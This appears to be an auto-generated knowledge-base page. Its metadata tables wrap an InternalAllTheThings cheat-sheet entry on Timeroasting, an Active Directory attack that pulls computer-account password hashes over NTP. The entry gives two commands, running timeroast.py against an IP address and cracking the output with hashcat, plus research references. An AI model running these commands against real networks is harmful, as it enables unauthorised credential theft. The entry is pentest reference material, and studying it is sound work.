---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Roasting - Timeroasting

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-roasting-timeroasting` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-roasting-timeroasting.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Roasting - Timeroasting](../../topics/active-directory/roasting-timeroasting.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-roasting-timeroasting |
| name | Roasting - Timeroasting |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-roasting-timeroasting.md |

## Preserved Source Material

````yaml
_body: "# Roasting - Timeroasting\n\n> Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated\
  \ attackers to effectively request a password hash of any computer account by sending an NTP request with that account's\
  \ RID\n\n* [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort\n\n    ```ps1\n\
  \    sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt\n    hashcat -m 31300 ntp-hashes.txt\n    ```\n\n## References\n\
  \n* [On the Applicability of the Timeroasting Attack - snovvcrash - December 8, 2024](https://snovvcrash.rocks/2024/12/08/applicability-of-the-timeroasting-attack.html)\n\
  * [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)\n\
  * [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)"
_relative_path: active-directory/ad-roasting-timeroasting.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-roasting-timeroasting.md
````
